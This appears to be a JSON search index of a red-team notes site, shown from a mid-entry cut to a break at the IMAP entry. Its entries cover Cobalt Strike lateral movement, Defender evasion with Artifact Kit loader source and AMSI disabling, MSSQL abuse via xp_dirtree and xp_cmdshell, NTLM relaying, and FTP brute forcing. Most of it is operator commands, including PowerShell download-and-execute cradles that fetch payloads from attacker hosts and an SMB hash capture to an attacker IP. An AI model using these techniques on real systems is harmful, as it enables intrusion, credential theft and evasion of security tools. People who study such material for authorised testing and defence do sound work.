(PowerShell) wmi Remote execute via WMI Powershell and execute-assembly We can specify the target in powershell and execute-assembly commands. baecon&gt; execute-assembly path payload.exe -computername=dc01 baecon&gt; powershell Get-ChildItem -computername=dc01 Spawn Notice that due to problems of CoInitializeSecurity COM object, a different security context for example another user can not be used in the same beacon process. To that reason we need to spawn another beacon. spawn and spawnas starts a new session with the provided credentials. beacon&gt; spawn The spawnas command will spawn a new process using plaintext credentials and will inject a beacon payload into it. beacon&gt; spawnas CORP\\user Passw0rd! smb-p2p-payload [+] established link to child beacon: 10.10.10.10 Note: A common mistake is to attempt this from a directory where te user does not have read access. Change directory to C:\\ and try it again. PowerShell Remoting The winrm and winrm64 methods can be used to use powershell remoting. WinRM will return a high integrity beacon running as the user with which are going to be interacted. # 64-bit target beacon&gt; jump winrm64 dc01 [P2P-Listener] # 32-bit target beacon&gt; jump winrm dc01 [P2P-Listener] Note: We can use Get-WmiObject to determine the arhitecture of the remote system. PsExec The psexec and psexec64 commands, first a service binary is uploaded to the target system, then a starting windows service is created to execute that binary. psexec_psh doesn’t copy the binary to the target, but instead executes a PowerShell one-liner (always in 32-bit). PsExec will return a beacon running by SYSTEM. beacon&gt; jump psexec64 dc01 [p2p-listener] Windows Management Instrumentation (WMI) The wmi remote-exec method uses WMI’s process call create to execute any command we specify on the target. The most straight forward means of using this to upload a payload to the target system and use WMI to execute it. beacon&gt; cd \\\\dc01\\ADMIN$ beacon&gt; upload C:\\p2p-smb-beacon.exe beacon&gt; remote-exec wmi dc01 C:\\Windows\\beacon.exe After executing the beacon we will neeed to connect to it. beacon&gt; link dc01 \\\\dc01\\pipe\\[namepipe] The Curious Case of CoInitializeSecurity If our beacon called CoInitializeSecurity in the context of “UserA” then the future BOFs such as WMI may not be able to inherit a different security context “UserB”. beacon&gt; make_token CORP\\userb password [+] Impersonated CORP\\usera beacon&gt; remote-exec wmi web.corp.local C:\\Windows\\smb_x64.exe CoInitializeSecurity already called. Thread token (if there is one) may not get used [-] Could not connect to web.dev.cyberbotic.io: 5 Our WMI execution needs to come from a different process. This can be achieved with commands such as spawn and spawnas or even SharpWMI. beacon&gt; execute-assembly C:\\Tools\\SharpWMI.exe action=exec computername=web.corp.local command=\"C:\\Windows\\smb_x64.exe\" Distributed Component Object Model (DCOM) Beacon has no built-in capabilities to interact over DCOM, so we can use Invoke-DCOM. https: github.com EmpireProject Empire blob master data module_source lateral_movement Invoke-DCOM.ps1 beacon&gt; powershell-import .\\Invoke-DCOM.ps1 beacon&gt; powershell Invoke-DCOM -ComputerName dc01 -Method MMC20.Application -Command C:\\Windows\\beacon-smb.exe beacon&gt; link dc01 OPSEC Note: DCOM is more complicated to detect, since each method works in a different way. If MMC20.Application method spawns a process, the spawned process will be a child of mmc.exe. ProcessId: 952 Image: C:\\Windows\\beacon-smb.exe ParentImage: C:\\Windows\\System32\\mmc.exe"
					}

					
				
			
		
			
				
					,
					

					"red-team-microsoft-defender": {
						"id": "red-team-microsoft-defender",
						"title": "Microsoft Defender Antivirus",
						"category": "",
						"url": " /red-team/microsoft-defender/",
						"content": "Microsoft Defender has three facets to its detection capability: On-Disk In-Memory Behavioural We can consult Defender detections via powershell. Get-MpThreatDetection | sort $_.InitialDetectionTime | select -First 1 On-Disk Detections Even though dropping files to disk has a bad reputation, there are instances whre it’s fairly unvoidable if we want to employ certain tactics. Defender has a database of definitions from which it can detect “known bad” very quickly. We can user ThreatCheck to identify which part of a file Defender dislikes. https: github.com rasta-mouse ThreatCheck Artifact Kit The Artifact Kit is used to modify the binary (EXE &amp; DLL) payloads. The signature for the default Cobalt Strike Beacon payload could be flagged. So we need to rebuild the payloads with the Artifact Kit. Note: Sometimes building with a different version of gcc can produce enough changes to break the signature. The Artifact Kit is designed to facilitate the development of AV-safe variants of these payloads based on the premise of loading shellcode in a manner in which AV engines cannot emulate. It works on a system of “bypass templates” which allow you to change existing bypass strategies for reading shelldoce, or implement entirely new ones. src-main main.c is the entry point of the EXE artifacts. It does nothing more han run a function called start and the njus loops to prevent the process from closing. #include \"windows.h\" void start(HINSTANCE handle); int main(int argc, char * argv[]) { start(NULL); * sleep so we don't exit * while (TRUE) Sleep(10000); return 0; } src-common bypass-template.c is not a bypass, but it servers to show how one can implement some logic inside the start function. We can see that it grabs the payload buffer, copies it into memory, calls a spawn function and then frees the buffer. #include &lt;windows.h&gt; #include &lt;stdio.h&gt; #include \"patch.h\" * The start function gets called when the bypass is ready to execute. The HINSTANCE is a handle to the current artifact. You can use this to determine the location of this artifact on disk (if it helps your bypass technique) * void start(HINSTANCE mhandle) { * phear is a struct that defines how artifact.cna will patch the payload data into this artifact. You're welcome to update artifact.cna to use your own convention if you like. * phear * payload = (phear *)data; char * buffer; * copy our payload into its own buffer... necessary b c spawn modifies it * buffer = (char *)malloc(payload-&gt;length); memcpy(buffer, payload-&gt;payload, payload-&gt;length); * execute our payload * spawn(buffer, payload-&gt;length, payload-&gt;key); * clean up after ourselves * free(buffer); } src-common bypass-pipe.c, this is one fo the bypass strategies included in the kit. #include &lt;windows.h&gt; #include &lt;stdio.h&gt; #include \"patch.h\" * a place to track our random-ish pipe name * char pipename[64]; void server(char * data, int length) { DWORD wrote = 0; HANDLE pipe = CreateNamedPipeA(pipename, PIPE_ACCESS_OUTBOUND, PIPE_TYPE_BYTE, 1, 0, 0, 0, NULL); if (pipe == NULL || pipe == INVALID_HANDLE_VALUE) return; BOOL result = ConnectNamedPipe(pipe, NULL); if (!result) return; while (length &gt; 0) { result = WriteFile(pipe, data, length, &amp;wrote, NULL); if (!result) break; data += wrote; length -= wrote; } CloseHandle(pipe); } BOOL client(char * buffer, int length) { DWORD read = 0; HANDLE pipe = CreateFileA(pipename, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (pipe == INVALID_HANDLE_VALUE) return FALSE; while (length &gt; 0) { BOOL result = ReadFile(pipe, buffer, length, &amp;read, NULL); if (!result) break; buffer += read; length -= read; } CloseHandle(pipe); return TRUE; } DWORD server_thread(LPVOID whatever) { phear * payload = (phear *)data; * setup a pipe for our payload * server(payload-&gt;payload, payload-&gt;length); return 0; } DWORD client_thread(LPVOID whatever) { phear * payload = (phear *)data; * allocate data for our \"cleaned\" payload * char * buffer = (char *)malloc(payload-&gt;length); * try to connect to the pipe * do { Sleep(1024); } while (!client(buffer, payload-&gt;length)); * spawn our payload * spawn(buffer, payload-&gt;length, payload-&gt;key); return 0; } void start(HINSTANCE mhandle) { * switched from snprintf... as some A V product was flagging based on the function *sigh* * sprintf(pipename, \"%c%c%c%c%c%c%c%c%cnetsvc\\\\%d\", 92, 92, 46, 92, 112, 105, 112, 101, 92, (int)(GetTickCount() % 9898)); * start our server and our client * CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&amp;server_thread, (LPVOID) NULL, 0, NULL); client_thread(NULL); } First sprintf is used to create a pseudo-random pipe called \\\\.\\pipe\\netsvc\\X where X is a random integer. server_thread will start a new named pipe server and copy the shellcode buffer into it. client_thread will read the shellcode from the pipe and the ncall those same spawn &amp; free functions. So, the only difference between bypass-template and bypass-pipe is that memcpy is replaced with named pipes. Although there is some scope for detecting other aspects of this specific bypass technique, such as the pipe name. That is, of course, trivial to change here. sprintf(pipename, \"%c%c%c%c%c%c%c%c%cchangeme\\\\%d\", 92, 92, 46, 92, 112, 105, 112, 101, 92, (int)(GetTickCount() % 9898)); Building the Artifact Kit After making our modifications we need to recompile it. The Artifact Kit is designed to be build on Linux via the included build.sh script. Usage: . build.sh [Artifact kit] [+] You have a x86_64 mingw--I will recompile the artifacts [Artifact kit] [-] Missing Parameters: [Artifact kit] [-] Usage: [Artifact kit] [-] . build &lt;techniques&gt; &lt;allocator&gt; &lt;stage&gt; &lt;rdll size&gt; &lt;include resource file&gt; &lt;output directory&gt; [Artifact kit] [-] - Techniques - a space separated list [Artifact kit] [-] - Allocator - set how to allocate memory for the reflective loader. [Artifact kit] [-] Valid values [HeapAlloc VirtualAlloc MapViewOfFile] [Artifact kit] [-] - Stage Size - integer used to set the space needed for the beacon stage. [Artifact kit] [-] For a 5K RDLL stage size should be 277492 or larger [Artifact kit] [-] For a 100K RDLL stage size should be 277492 or larger [Artifact kit] [-] - RDLL Size - integer used to specify the RDLL size. Valid values [0, 5, 100] [Artifact kit] [-] - Resource File - true or false to include the resource file [Artifact kit] [-] - stack spoof - true or false to use the stack spoofing technique [Artifact kit] [-] - Output Directory - Destination directory to save the output [Artifact kit] [-] Example: [Artifact kit] [-] . build.sh \"peek pipe readfile\" HeapAlloc 361000 5 true true tmp dist artifact Techniques: Are the bypass templates to compile, we can provide just one or a space-separated list. Allocator: Defines the API used to allocate memory for the shellcode. The out-of-the-box options are HeapAlloc, VirtualAlloc and MapViewOfFile. You can create a custom allocation by adding one in patch.c. Stage Size: Defines the space required for Beacon’s reflective DLL loader. This loader can be modified using the User Defined Reflective Loader (UDRL) kit. Default size is 5K. RDLL Size: This option is used to sanity-check the value you provided for the stage size. For example, if you specified 271360 for the stage size, but 100 for the RDLL size, the build script will abort and tell you that 271360 is not large enough for a 100K loader. Note that the “minimum” stage size can change between CS versions. Resource File: Allows you to build the arficat with custom metadata, there is an included resource file src-main resource.rc that we can modify to give the artifact different version numbers, product name, company name, and even an icon. Stack Spoof: Simple Boolean option, which enables call stack spoofing whilst the Beacon is sleeping. Output Directory: Is the location where you want the artifact build. After building it will produce an artifact.cna file that we need to load into the CobaltStrike Cobalt Strike -&gt; Script Manager -&gt; Load. In-Memory Detections The AMSI is a component of Windows which allows applications to integrate themselves with an antivirus engine. It was designed to tackle fileless malware. Any third party application can use AMSI to scan user input for malicious content. Many Windows Components now also use AMSI Including PowerShell, the Windows Script Host, JavaScript, VBScript and VBA. Resource Kit Resource Kit is used to modify the script-based payloads including PowerShell, Python, HTA and VBA templates. HelpSsytems have already provided a template with different variables names ($zz instead of $x and $v_code instead of $var_code) that will bypass defender. So we can upload and use the resource.cna of HelpSystems to bypass Defender. AMSI vs Post-Exploitation The Beacon payload is not the only place AMSI will be present. In various post-exploitation commands AMSI will instrument. For example powershell, powerpick, execute-assembly and more over. This occurs because Beacon will spawn new process to execute these commands, and each process gets its own copy of AMSI. It would be a bit of a pain to modify and obfuscate every single post-ex tool, so Coblalt Strike introuced a configuration that we can apply in Malleable C2 profile called amsi_disable. This uses a memory-patching technique to disable AMSI in the spawned process prior to injecting the post-ex capability. post-ex { set amsi_disable \"true\"; } Note: amsi_disable only applies to powerpick, execute-assembly and psinject. It does not apply to the powershell command. Behavioural Detections When Cobalt Strike runs a post-ex command that uses the fork &amp; run pattern, it will spawn a sacrificial process, inject the post-ex capability into it, retrieve the output over a named pipe, and then kills the process. The reason is to ensure that unstable post-ex tools don’t crash the Beacon. rundll32 being the default spawnto for Cobalt Strike is a common point of detection. The service binary payload used by psexec also uses this by default, which is why you see those Beacons running as rundll32.exe. The process used for post-ex commands and psexec can be changed on the fly in the CS GUI. To change it run spawnto, x64 and x86 must be specified individually and environment variables can also be used. beacon&gt; spawnto x64 %windir%\\sysnative\\dllhost.exe beacon&gt; spawnto x86 %windir%\\syswow64\\dllhost.exe Note: The sysnative and syswow64 paths should be used rathen than system32. We can reset to default values with spawnto command: beacon&gt; spawnto [*] Tasked beacon to spawn features to default process To change the spawnto used by psexec use the ak-settings commands. beacon&gt; ak-settings spawnto_x64 C:\\Windows\\System32\\dllhost.exe [*] Updating the spawnto_x64 process to 'C:\\Windows\\System32\\dllhost.exe' [*] artifact kit settings: [*] service = '' [*] spawnto_x86 = 'C:\\Windows\\SysWOW64\\rundll32.exe' [*] spawnto_x64 = 'C:\\Windows\\System32\\dllhost.exe' beacon&gt; ak-settings spawnto_x86 C:\\Windows\\SysWOW64\\dllhost.exe [*] Updating the spawnto_x86 process to 'C:\\Windows\\SysWOW64\\dllhost.exe' [*] artifact kit settings: [*] service = '' [*] spawnto_x86 = 'C:\\Windows\\SysWOW64\\dllhost.exe' [*] spawnto_x64 = 'C:\\Windows\\System32\\dllhost.exe' Note: The Artifact Kit does not support the use of environment variables by default. You may also change the name of the service with: ak-settings service [name] The default spawnto can be change inside the Malleable C2 Profile by including the spawnto_x64 and spawnto_x86 inside the post-ex block. post-ex { set amsi_disable \"true\"; set spawnto_x64 \"%windir%\\\\sysnative\\\\dllhost.exe\"; set spawnto_x86 \"%windir%\\\\syswow64\\\\dllhost.exe\"; }"
					}

					
				
			
		
			
				
					,
					

					"red-team-ms-sql-servers": {
						"id": "red-team-ms-sql-servers",
						"title": "MS SQL Servers",
						"category": "",
						"url": " /red-team/ms-sql-servers/",
						"content": "Microsoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications—which may run either on the same computer or on another computer across a network. In addition to the obvious data theft opportunities, they also have a large attack surface, allowing code execution, privilege escalation, lateral movement and persistence. PowerUpSQL is an excellent tool to abuse and exploit MSSQL Servers. https: github.com NetSPI PowerUpSQL Discovery There are some cmdlets to find MSSQL Servers. Get-SQLInstanceDomain Get-SQLInstanceDomainBroadcast Get-SQLInstanceScanUDP Note: SQLInstanceDomain works by searching SPN that begins with MSSQL. It is also important to search domain groups that sounds like they may have access to database instances for example SQLAdmins, MSSQLAdmin, etc… Gather Information With Get-SQLServerInfo we can get more information about the instance. Get-SQLServerInfo -Instance \"mssql.corp.io,1443\" Test Connection Note If there are multiple SQL Servers, we can chain these commands. Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq \"Accessible\" } | Get-SQLServerInfo Query the Server There are different ways to access to a MSSQL Server, but we can access when a user have sysadmin role for the instance. PowerUpSQL: Get-SQLQuery -Instance \"mssql.corp.io,1443\" -Query \"select @@servername\" Column1 ------- MSSQL mssqlclient.py: python3 mssqlclient.py -windows-auth CORP bob@10.10.10.10 sqsh: sqsh -S 10.10.10.10 -U bob -P P@ssw0rd! -D databaseName HeidiSQL: Windows SQL GUI tool. MSSQL NetNTLM Capture MSSQL have some procedures, xp_dirtree can be used to capture the NetNTLM hash of the principal being used to run the MSSQL Service. We can use Inveigh to capture the NetNTLM hash. beacon&gt; execute-assembly C:\\Tools\\Inveigh.exe -DNS N -LLMNR N -LLMNRv6 N -HTTP N -FileOutput N After starting the Listener, we can execute the xp_dirtree procedure and list a smb share of our listener. EXEC xp_dirtree '\\\\attacker-ip\\pwn', 1, 1 Finally we can crack the hash with hashcat or john. Hashcat hashcat -a 0 -m 5600 mssql.hash wordlist John john --format=netntlmv2 --wordlist=wordlist mssql.hash Command Execution The xp_cmdshell procedure can be used to execute shell commands on the SQL Server. PowerUpSQL: Invoke-SQLCmd -Instance \"mssql.corp.io,1443\" -Command \"whoami\" -RawResults corp\\svc_mssql Note: Invoke-SQLCmd automatically attemp to enable xp_cmdshell, execute the given command an then re-disable it. Manually: EXEC xp_cmdshell 'whoami'; Sometimes this can lead an error due to xp_cmdshell is disabled. Check the configuration with the following command. SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'; Reconfigure the value to 1 in order to enable the procedure. sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE; And finally execute the command. EXEC xp_cmdshell 'whoami'; OPSEC Alert: Ensure you set the configuration to the original values after making a change on configurations. Note: There is a SQL command length limit that will prevent you from sending large payloads directly in the query, use Reverse Port Forwards and Pivot Listeners. Beacon Execution Since MSSQL Server does not have access to the team server and the payload is hosted on the team server, we can do a reverver port forwarding to forward port 80 of the TeamServer to port 8080 of the beacon. beacon&gt; rportfwd 8080 &lt;ip-teamserver&gt; 80 Create a Pivot Listener and host it via Scripted Web Delivery. $str = IEX((New-Object Net.WebClient).DownloadString('http: &lt;ip-beacon&gt;:8080 s1')) [Ssystem.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str)) Finally append the command to the xp_cmdshell procedure. EXEC xp_cmdshell 'powershell -w hidden -enc &lt;B64-EncodedCommand&gt;'; Lateral Movement (Linked Servers) SQL Servers have a concept called “Linked Servers”, which allows a database instance to access data from an external source. Discovery links We can discover Database Links in many ways. PowerUpSQL: Get-SQLServerLink -Instance mssql.corp.local -Verbose Manually: SELECT * FROM master..sysservers; Query a Remote Instance With OpenQuery we can query a remote instance: SELECT * FROM OPENQUERY(\"sql-1.corp.local\", 'select @@servername'); Note: The use of double and single quotes are important when using OpenQuery. It is not possible to enable xp_cmdshell via OpenQuery. If RPC Out is enabled on the link which is not the default configuration, you can enable xp_cmdshell using the following command: EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [sql-1.corp.local] EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [sql-1.corp.local] Crawl between Instances Manually querying databases to find links can consume a lot of time. We can use Get-SQLServerLinkCrawl to automatically crawl all available links. PowerUpSQL: beacon&gt; powershell Get-SQLServerLinkCrawl -Instance \"mssql.corp.local,1443\" We can execute commands manually by concatenating commands: 1 hop: SELECT * FROM OPENQUERY(\"mssql.corp.local\", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc &lt;base64&gt;''') 2 hop: SELECT * FROM OPENQUERY(\"mssql.corp.local\", 'select * from openquery(\"sql01.extcorp.local\", ''select @@servername; exec xp_cmdshell ''''powershell -enc &lt;base64&gt;'''''')') And more over… Get-SQLServerLinkCrawl has an easier way to execute commands on every hop: powershell Get-SQLServerLinkCrawl -Instance \"mssql.corp.local,1443\" -Query \"exec master..xp_cmdshell 'powershell -w hidden -enc &lt;base64&gt;'\" Privilege Escalation This instance of SQL is running as NT Service\\MSSQL$SQLEXPRESS, which is generally configured by default on more modern SQL installers. It has a special type of privilege called SeImpersonatePrivilege. This allows the account to “impersonate a client after authentication”. Consult Windows Privesc section to check how to privesc."
					}

					
				
			
		
			
				
					,
					

					"red-team-opsec-infrastructure": {
						"id": "red-team-opsec-infrastructure",
						"title": "OPSEC Infrastructure",
						"category": "",
						"url": " /red-team/opsec-infrastructure/",
						"content": "Command &amp; Control (C2) Command and Control server as known as C2 or C&amp;C is a computer controlled by an attacker which is used to send commannds to systems compromised by malware and receive stolen data from a target network. During the inital compromise phase, a malicious payload is executed that will call back to infrastructure controlled by the adversary. This payload is commonly referred to as an “implant”, “agent” or “RAT” (Remote Access Trojan). The server is the central control point of an engagement and allows an adversary to issue commands to compromised endpoints and receive the results. There are differents C2 with different capabilities, but in general they have the ability to execute different flavours of code and tooling to facilitate the adversarial objectives, such as shell commands, PowerShell, native executables, reflective DLLs and .NET as well as network pivoting and defence evasion. The agent can communicate with the infrastructure over different protocols such as HTTP(S), DNS, SMB and moreover. There are a list of C2 frameworks that can be filtered by their features and capabilities. https: www.thec2matrix.com matrix Redirector Domain Fronting Domain Borrowing"
					}

					
				
			
		
			
				
					,
					

					"red-team-pivoting": {
						"id": "red-team-pivoting",
						"title": "Pivoting",
						"category": "",
						"url": " /red-team/pivoting/",
						"content": "Pivoting are post-explotaiton techniques that allows us to access to the network where we have just landed. SOCKS Proxies A SOCKS (Secure Socket) Proxy exchanges network packets between a client and a server via a “proxy”. It’s very useful when we need to leverage with others toolsets that are only available in linux such as impacket. Note: The port will binding on the Team Server. To start a socks proxy we can use: SOCKS4: beacon&gt; socks [port] SOCKS5 with password: beacon&gt; socks [post] socks5 disableNoAuth [socks_user] [socks_password] enableLogging Finally we can access it with proxychains, but first we need to configure etc proxychains.conf file. SOCKS4: socks4 127.0.0.1 [port] SOCKS5 with password: socks5 127.0.0.1 [port] [socks_user] [socks_password] proxychains -q [command] [arguments] Windows Apps It is also possible to tunnel Windows GUI apps using proxifier. https: www.proxifier.com With Proxifier we can specify which application we want to tunneling. To use Windows authentication via a proxy, the application needs to be launched as a user from the target domain. runas netonly user:CORP\\user C:\\Tools\\program.exe` It can also be achieved with mimikatz. mimikatz # privilege::debug mimikatz # sekurlsa::pth domain:DEV user:bfarmer ntlm:4ea24377a53e67e78b2bd853974420fc run:mmc.exe Or we can use powershell credentials: $cred = Get-Credential Get-ADComputer -Server 10.10.10.10 -Credential $cred Port Forwarding I will not explain what is a port forwarding since is detailed on Post-Exploitation section on this gitbook, but we will discuss how to execute it from Cobalt Strike. beacon&gt; rportfwd 8080 10.10.10.10 80 [+] started reverse port forward on 8080 to 10.10.10.10:80 To stop the forwarding: beacon&gt; rportfw stop 8080 Notes: Beacon’s reverse port forward always tunnels the traffic to the Team Server and the Team Server sends the traffic to its intended destintation. The traffic is tunnelled inside the Beacon’s C2 traffic, not over separate sockets. You don’t need to be a local admin to create reverse port forwards on high ports. rportfwd_local will tunnel the traffic to the machine running Cobalt Strike client instead of the Team Server. beacon&gt; rportfwd_local 443 127.0.0.1 443 [+] started reverse port forward on 443 to mvc1009 -&gt; 127.0.0.1:443 Alert: Be careful, you must create an allow rule before running a reverse port forward. beacon&gt; powershell New-NetFirewallRule -DisplayName \"Test Rule\" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080 beacon&gt; powershell Remove-NetFirewallRule -DisplayName \"Test Rule\" NTLM Relaying During an on-premise assessments, NTLM relaying with tools like responder and ntlmrelayx is quite trivial. However in red team assessment, is not quite trivial because port 445 is always bound and in use by Windows machines. It’s still possible with Cobalt Strike, but requires the use of multiple capabilities. Use a driver WinDivert to redirect traffic destinated for port 445 to another port (4445). It requires local admin access in order for loading the driver. Upload the driver to C:\\Windows\\System32\\drivers since this is where most windows drivers go. beacon&gt; cd C:\\Windows\\System32\\drivers beacon&gt; upload C:\\Tools\\PortBender\\WinDivert64.sys PortBender: https: github.com praetorian-inc PortBender Load PortBender.cna aggressor script and redirect the traffic. beacon&gt; PortBender redirect 445 4445 Create a reverse port forwarding that will then relay the traffic from port 4445 to port 445 on the Team Server where ntlmrelayx will be waiting. beacon&gt; rportfwd 4445 127.0.0.1 445 A SOCKS proxy is required to allow ntlmrelayx to send traffic back into the network. beacon&gt; socks 5566 Finally on the Team Server execute the ntlmrelayx tool, by default will execute secretsdump to dump local SAM hashes on the target machine. proxychains -q python3 usr local bin ntlmrelayx.py -t smb: &lt;target-ip&gt; -smb2support --no-http-server --no-wcf-server Instead of dumping SAM we can execute payloads such as beacons. proxychains -q python3 usr local bin ntlmrelayx.py -t smb: &lt;target-ip&gt; -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -c \"IEX(New-Object Net-WebClient).DownloadString(\\\"http: 10.10.10.10 a\\\")\"' To stop PortBender just kill the process. beacon&gt; jobs [*] Jobs JID PID Description --- --- ----------- 0 1240 PortBender beacon&gt; jobkill 0 beacon&gt; kill 1240 NTLM Capturing We can use Inveigh to listen to incoming requests, similar to Responder but in .NET. https: github.com Kevin-Robertson Inveigh Inveigh should be run as a local admin. beacon&gt; execute-assembly C:\\Tools\\Inveigh.exe -DNS N -LLMNR N -LLMNRv6 N -HTTP N -FileOutput N It it also possible use the WinDivert, rportfwd and smbserver to capture the NetTLMHash."
					}

					
				
			
		
			
				
					,
					

					"services-dns": {
						"id": "services-dns",
						"title": "PORT 53/tcp - DNS",
						"category": "",
						"url": " /services/dns/",
						"content": "The Domain Name System (DNS) is the phonebook of the Internet. Humans access information online through domain names, like nytimes.com or espn.com. Introduction In this section only will be shown the methodology to enumerate locally the DNS service. If you need to take a look of DNS enumeration vía internet, you will found in the following section. Information Gathering DNS queries produce listing calls Resource Records. This is a representation of Resource Records: Enumeration First we will need to a Reverse DNS Lookup, With Reverse DNS Lookup, we will receive the IP address associated to a given domain name. # With nslookup nslookup &gt; server IP_DNS_SERVER &gt; IP # With dig dig -x IP @IP_DNS_SERVER There are usually two name servers. Take note of both of them an run the next command to show all A records: nslookup -query=AXFR [Domain] [Nameserver] dig axfr DOMAIN.LOCAL @IP_DNS_SERVER Finally, just add the DNS records to you etc hosts."
					}

					
				
			
		
			
				
					,
					

					"services-ftp": {
						"id": "services-ftp",
						"title": "PORT 21/tcp - FTP",
						"category": "",
						"url": " /services/ftp/",
						"content": "Introduction FTP (File Transfer Protocol) is used to communicate and transfer files between computers on a TCP IP (Transmission Control Protocol Internet Protocol) network, aka the internet. Users, who have been granted access, can receive and transfer files in the File Transfer Protocol server (also known as FTP host site). Anonymous User In some devices anonymous user is enabled. It’s important to give it a try. ftp 10.10.10.10 name: anonymous pass Bruteforcing Credentials To bruteforce the login in order to find valid credentials we can use different tools: Ncrack ncrack -U usernames.txt -P passowrds.txt ftp: 10.10.10.10 -v ncrack -u root -P passowrds.txt ftp: 10.10.10.10 -v Medusa medusa -h 10.10.10.10 -U usernames.txt -P passowrds.txt -M ftp medusa -h 10.10.10.10 -u root -P passowrds.txt -M ftp Hydra hydra -L usernames.txt -P passwords.txt ftp: 10.10.10.10 -s 21 hydra -l root -P passwords.txt ftp: 10.10.10.10 -s 21 Patator patator ftp_login host=10.10.10.10 user=FILE0 password=FILE1 0=usernames.txt 1=passwords.txt -x ignore:mesg='Login incorrect.' patator ftp_login host=10.10.10.10 user=root password=FILE0 0=passwords.txt -x ignore:mesg='Login incorrect.' FileZilla Server (From LFI) FileZilla Server credentials FileZilla Server credentials are stored on the FileZilla Server.xml file stored in one of the following routes: C:\\Program Files (x86)\\FileZilla Server\\FileZilla Server.xml C:\\Program Files\\FileZilla Server\\FileZilla Server.xml C:\\xampp\\FileZillaFTP\\FileZilla Server.xml Some times we can found it on plain text (base64) and sometimes encrypted. To decrypt we can use the following tool: python filezilla-decrypt.py --wordlist usr share wordlists rockyou.txt Note: You need to modify password and salt variables of the python script and unescape the salt. &amp;amp; = &amp; &amp;lt; = &lt; &amp;apos; = ' &amp;quot; = \" &amp;gt; = &gt; # Example Escaped: `!U3`CQ;a&amp;amp;3IzbXc 4Wpb\\)OZ3TsXP;&amp;apos;Wx#^K&amp;quot;Tu_XX.K&amp;apos;o&amp;lt;&amp;apos;c&amp;amp;A:vItTX-M|Z0Y Unescaped: `!U3`CQ;a&amp;3IzbXc 4Wpb\\)OZ3TsXP;'Wx#^K\"Tu_XX.K'o&lt;'c&amp;A:vItTX-M|Z0Y https: github.com l4rm4nd FileZilla-Password-Decryptor FileZilla client credentials FileZilla client save last saved credentials on the following link. C:\\Users\\VICTIM\\AppData\\Roaming\\FileZilla\\RecentServers.xml"
					}

					
				
			
		
			
				
					,
					

					"services-http": {
						"id": "services-http",
						"title": "PORT 80/tcp, 443/tcp - HTTP Server",
						"category": "",
						"url": " /services/http/",
						"content": "It is a brief methodology to use in front of web applications. Scanning First of all we need to scan the ports and use some enumerating tools such as nmap, nikto or davtest. Nmap Search for vulns: nmap -p 80,443 -sV -sC --script=http-vuln* 10.10.10.10 Search for info: nmap -p 80,443 -sV -sC 10.10.10.10 Nikto Nikto is a free software command-line vulnerability scanner that scans webservers for dangerous files CGIs. nikto -host 10.10.10.10:80 Davtest DAVTest tests WebDAV enabled servers by uploading test executable files, and then (optionally) uploading files which allow for command execution or other actions directly on the target. davtest --url http: 10.10.10.10 Fuzzing In the world of cybersecurity, fuzz testing (or fuzzing) is an automated software testing technique that attempts to find hackable software bugs by randomly feeding invalid and unexpected inputs and data into a computer program in order to find coding errors and security loopholes. This technique is also used to discover new web content such as directories, files or parameters. There are many different tools that could help us to do fuzzing in web applications (wfuzz, ffuf, dirb, dirbuster…). But I’m going to use wfuzz and ffuf. Directory Fuzzing Wordlist: usr share wordlist dirbuster directory-list-2.3-medium.txt usr share seclists Discovery Web-Content raft-medium-directories.txt usr share seclists Discovery Web-Content raft-medium-words.txt #IIS Server usr share seclists Discovery Web-Content raft-medium-directories-lowercase.txt usr share seclists Discovery Web-Content raft-medium-words-lowercase.txt Note: IIS server is non-case sensitive Command: gobuster dir -w wordlists.txt -x 'asp,aspx,html' -b 404 -u http: SEVER_IP:PORT ffuf -w wordlists.txt:FUZZ -e .php,.html-.aspx -u http: SERVER_IP:PORT FUZZ -recursion -recursion-depth 1 dirb http: SERVER_IP:PORT wfuzz -Z -c -w wordlists.txt -z list,-.asp-.aspx-.html --hc 404 http: SERVER_IP:PORT FUZZFUZ2Z Vhost Fuzzing Wordlists: opt SecLists Discovery DNS subdomains-top1million-5000.txt usr share seclists Discovery DNS shubs-subdomains.txt Command for different hosts: ffuf -w opt SecLists Discovery DNS subdomains-top1million-5000.txt:FUZZ -u https: FUZZ.example.com Command for the same host: wfuzz -Z -c -w usr share seclists Discovery DNS shubs-subdomains.txt -H \"Host: FUZZ.example.com\" --hh &lt;length&gt; http: ip-addr Parameter Fuzzing Wordlist: opt SecLists Discovery Web-Content burp-parameter-names.txt GET ffuf -w opt SecLists Discovery Web-Content burp-parameter-names.txt:FUZZ -u http: example.com admin admin.php?FUZZ=key -fs xxx POST ffuf -w opt SecLists Discovery Web-Content burp-parameter-names.txt:FUZZ -u http: example.com admin admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application x-www-form-urlencoded' -fs xxx Default Installation Routes These are some default installation routes of Linux and Windows webservers. Linux var www html Windows C:\\xampp\\htdocs\\ C:\\inetpub\\wwwroot\\"
					}

					
				
			
		
			
				
					,
					

					"services-imap": {
						"id": "services-imap",
						"title": "PORT 143/tcp, 993/tcp - IMAP",
						"category": "",
						"url": " /services/imap/",
